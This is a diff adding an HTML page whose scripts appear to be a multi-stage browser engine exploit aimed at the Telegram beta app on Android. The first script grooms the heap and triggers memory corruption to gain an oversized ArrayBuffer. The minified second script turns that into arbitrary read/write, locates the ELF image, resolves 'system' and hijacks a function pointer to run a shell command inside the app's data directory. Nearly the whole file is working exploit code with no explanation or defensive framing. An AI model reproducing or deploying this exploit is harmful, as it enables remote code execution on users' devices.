@@ -1,0 +1,45 @@
+<!doctype html><body><div id="v">Ok</div><script id="stageA">"use strict";
+function f([] = eval("[]")) { var q1 = 0, q2 = 0, q3 = 0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; }
+var SY = new Array(65600);
+for (var i = 0; i < 65600; i++) SY[i] = Symbol();
+/* keep only a window of the last symbols: the atom array stays
+   large and slot 65535 stays live; the other symbol strings are
+   freed to reclaim heap. */
+var KEEP = SY.slice(65600 - 3000); SY = null;
+var RT = [4,0,0,0,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0], RJ = [4,0,0,0,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0];
+var PB = new Uint8Array(2544);
+var A = new Array(1100), UV = new Array(1100);
+for (var i = 0; i < 1100; i++) { A[i] = new ArrayBuffer(2544); }
+for (var i = 0; i < 1100; i++) { UV[i] = new Uint8Array(A[i]); }
+var D = new Array(3000);
+for (var i = 0; i < 3000; i++) D[i] = new ArrayBuffer(64);
+var T = new Array(600);
+for (var i = 0; i < 600; i++) T[i] = new ArrayBuffer(64);
+T[600-2] = null;
+var mark = "NOCORR";
+function fill(p, q) {
+  PB.fill(0);
+  for (var o = p; o + 40 <= 2544; o += 40) {
+    for (var k = 0; k < 20; k++) { PB[o + k] = (q ? RJ[k] : RT[k]); PB[o + 20 + k] = (q ? RT[k] : RJ[k]); }
+  }
+  for (var i = 0; i < 1100; i++) UV[i].set(PB);
+}
+var hit = 0;
+for (var ph = 0; ph < 20 && !hit; ph += 4) {
+  for (var q = 0; q < 2 && !hit; q++) {
+    fill(ph, q);
+    try { f(); } catch (e) {}
+    for (var i = 0; i < 600; i++) {
+      if (T[i] !== null && T[i].byteLength > 1024) {
+        hit = 1; mark = "ABLEN[" + i + "]=" + T[i].byteLength;
+        break;
+      }
+    }
+  }
+}
+var V = null, VAB = null;
+for (var i = 0; i < 600; i++) { if (T[i] !== null && T[i].byteLength > 1024) { VAB = T[i]; break; } }
+if (VAB) { try { V = new Uint8Array(VAB); mark += " VLEN=" + V.length; } catch (e2) { mark += " VERR=" + e2; } }
+globalThis.V = V; globalThis.VAB = VAB; globalThis.T = T;
+throw new Error("RESULT " + mark);
+</script><script id="stageB">!function(){var r,f=281474976710656,t="";try{var n=globalThis.V,a=globalThis.VAB;if(!n||327744!==n.length||!a)throw"NOV";var i,o,e=function(r){return(n[r]|n[r+1]<<8|n[r+2]<<16|n[r+3]<<24)>>>0},v=function(r){var f=e(r);return e(r+4)%65536*4294967296+f},u=function(r){return r>65536&&r<f-1&&r%8==0},h=function(r){return r>65536&&r<f-1&&r%4==0},l=-1,c=0;for(i=0;i+72<225280;i+=8)if(24===e(i+18)&&327744===e(i+64)&&(r=v(i+56))>65536&&r<f-1&&r%8==0){l=i,c=v(i+56);break}if(l<0)return void(globalThis.MEGA="HF ERR NOANCHOR VNC=0 VO=-1 X=0 XG=0 G=0 GS=0 V=0 VK=0 VG=0 O24=-1");try{o=new Uint8Array(a)}catch(r){throw"NOV2"}if(327744!==o.length)throw"NV2L";var O,g,V=function(r){!function(r,f){var t=f%4294967296,n=Math.floor(f/4294967296);o[r]=255&t,o[r+1]=t>>>8&255,o[r+2]=t>>>16&255,o[r+3]=t>>>24&255,o[r+4]=255&n,o[r+5]=n>>>8&255,o[r+6]=n>>>16&255,o[r+7]=n>>>24&255}(l+56,r)},N=function(r){var f=(n[r]|n[r+1]<<8|n[r+2]<<16|n[r+3]<<24)>>>0;return((n[r+4]|n[r+5]<<8|n[r+6]<<16|n[r+7]<<24)>>>0)%65536*4294967296+f},G=function(r){return n[r]|n[r+1]<<8},b=function(r){return(n[r]|n[r+1]<<8|n[r+2]<<16|n[r+3]<<24)>>>0},s=function(r){var f=b(r);return 4294967296*b(r+4)+f},A=[],w=null,R=0,M=0,d=0,C=-1,E=0,k=0,H=0,T=0,S=0,X=0,y=0;if(V(c-8),g=c-8-G(0)*(O=[16,24,32,40,48,56,64,72,80,88,96,104,112,120,128,144,160,176,192,208,224,240,256,288,320,352,384,416,448,480,512][n[2]])-48,O&&g%4096==0&&g<=c&&c-g<4096){if(R=3,V(g),T=N(32),u(T)&&(R=4,V(T),S=N(16),X=G(24),(y=Math.floor((c-S)/4096))>=0&&y<16&&X&1<<y)){var F=function(r){if(u(r)){V(r);var f=N(16),t=G(24);u(f)&&A.push([f,t])}};F(T);var K,m,Y=T;for(K=0;K<64&&(V(Y),m=N(8),u(m)&&m!==T);K++)F(m),Y=m;for(Y=T,K=0;K<64&&(V(Y),m=N(0),u(m)&&m!==T);K++)F(m),Y=m;w=new Array(81);for(var p=0;p<81;p++){var B=c+4096*p;w[p]=0;for(var D=0;D<A.length;D++){var L=A[D][0],P=A[D][1];if(B>=L&&B<L+65536){var U=Math.floor((B-L)/4096);w[p]=P>>(15&U)&1;break}}}w[0]?R=5:(w=null,R=4)}}else R=2;var j=function(r){var f=r>>12;return w&&f>=0&&f<81&&w[f]},q=function(r){for(var f=0;f<A.length;f++){var t=A[f][0],n=A[f][1];if(r>=t&&r<t+65536)return n>>(15&Math.floor((r-t)/4096))&1}return 0},x=function(r){return r>65536&&r<f-1&&r%8==0},z=[8388608,6291456,4194304],I=function(r){if(!x(r)||!q(r))return H=H||1,0;V(r);var f=N(24);if(!x(f)||!q(f))return H=H||2,0;V(f);var t=N(48);if(!x(t)||!q(t))return H=H||3,0;V(t);var n=N(32);if(!x(n)||!q(n))return H=H||4,0;V(n);var a,i,o=0;for(a=0;a<32;a++){var e=16*a;if(q(n+e+8)&&q(n+e+12)&&4294967295===b(e+8)&&4294967295===b(e+12)&&(i=N(e),x(i)&&q(i))){if(V(i),12===G(18)){o=i;break}V(n)}}if(!o)return H=H||5,0;V(o);var v=N(56);if(!h(v))return H=H||6,0;var u=N(48);if(!x(u))return H=H||7,0;V(u);var l=N(16);if(!x(l))return H=H||8,0;V(l);var c=s(56);if(c!==z[0]&&c!==z[1]&&c!==z[2])return H=H||8,0;var O=N(16);if(!h(O))return H=H||9,0;var g=O-24425332;return g<65536||g%4096!=0?(H=H||9,0):[u,l,O,g]};if(w){for(i=0;i+48<327744&&!M;i+=8)j(i+18)&&20==(o[i+18]|o[i+19]<<8)&&(d++,C<0&&(C=i),M=I(c+i));E=H,H=0}if(!M&&w){var J=[],Q=function(r){if(u(r)){V(r);var f,t,n,a=N(16),i=G(24);if(u(a))for(V(a),f=0;f<16;f++)if(i&1<<f){var o=4096*f;if(12===b(o+40))for(n=4048/112,t=0;t<n;t++){var e=o+48+8+112*t;G(e-8)===t&&20===G(e+18)&&J.length<4096&&J.push(a+e)}}}};Q(T);var W,Z,$=T;for(W=0;W<64&&(V($),Z=N(8),u(Z)&&Z!==T);W++)Q(Z),$=Z;for($=T,W=0;W<64&&(V($),Z=N(0),u(Z)&&Z!==T);W++)Q(Z),$=Z;for(i=0;i<J.length&&!M;i++)M=I(J[i]);if(k=H,!M)return void(globalThis.MEGA="HF ERR NOANCHOR VNC="+d+" VO="+C+" X="+E+" XG="+k+" G="+J.length+" GS="+A.length+" V=0 VK=1 VG="+R+" O24="+l)}if(!M)return void(globalThis.MEGA="HF ERR NOANCHOR VNC="+d+" VO="+C+" X="+E+" XG="+k+" G=0 GS="+A.length+" V=0 VK=1 VG="+R+" O24="+l);var _=M[1],rr=(M[2],M[3]);V(rr+26681296);var fr=N(0);if(!h(fr))throw"NOGOT";var tr=function(r,f){if(V(r),n[0]!==f.charCodeAt(0))return!1;for(var t=1;t<f.length;t++)if(n[t]!==f.charCodeAt(t))return!1;return 0===n[f.length]},nr=fr-fr%4096,ar=0;for(i=0;i<8192;i++){var ir=nr-4096*i;if(ir<65536)break;if(V(ir),1179403647===b(0)){ar=ir;break}}if(!ar)throw"NOELF";V(ar);var or=s(32),er=G(54),vr=G(56);if(56!==er||vr<1||vr>64)throw"BADPH";var ur=0;for(i=0;i<vr;i++){var hr=or+i*er;if(2===b(hr)){ur=ar+s(hr+16);break}}if(!ur)throw"NODYN";V(ur);var lr=0,cr=0,Or=0;for(i=0;i<512;i++){var gr=16*i,Vr=s(gr),Nr=s(gr+8);if(0===Vr)break;var Gr=Nr>16777216?Nr:ar+Nr;5===Vr?lr=Gr:6===Vr?cr=Gr:10===Vr&&(Or=Nr)}if(!cr||!lr||!Or)throw"NOSYM";V(cr);var br=0;for(i=1;i<3e4;i++){V(cr);var sr=24*i,Ar=b(sr)>>>0;if(!(0===Ar||Ar>=Or)&&tr(lr+Ar,"system")){V(cr),br=ar+s(sr+8);break}}if(!br)throw"NOSYS";var wr=function(r,f){V(r);var t=f%4294967296,a=Math.floor(f/4294967296);n[0]=255&t,n[1]=t>>>8&255,n[2]=t>>>16&255,n[3]=t>>>24&255,n[4]=255&a,n[5]=a>>>8&255,n[6]=a>>>16&255,n[7]=a>>>24&255};for(V(c),i=0;i<50;i++)n[i]=255&"id>/data/data/org.telegram.messenger.beta/files/n1".charCodeAt(i);n[50]=0,V(_),wr(_+64,c),wr(_+16,br),t="OK"}catch(r){t="ERR "+r}globalThis.MEGA="HF "+t}();/*PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP*/</script><script id="stageC">if(0){try{var m=typeof mark!="undefined"?mark:"-",e=typeof MEGA!="undefined"?MEGA:"-";var x="S1 "+m+" END="+e;var D=document.getElementById("v");D&&(D.textContent=x)}catch(r){}}/*PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP*/</script>
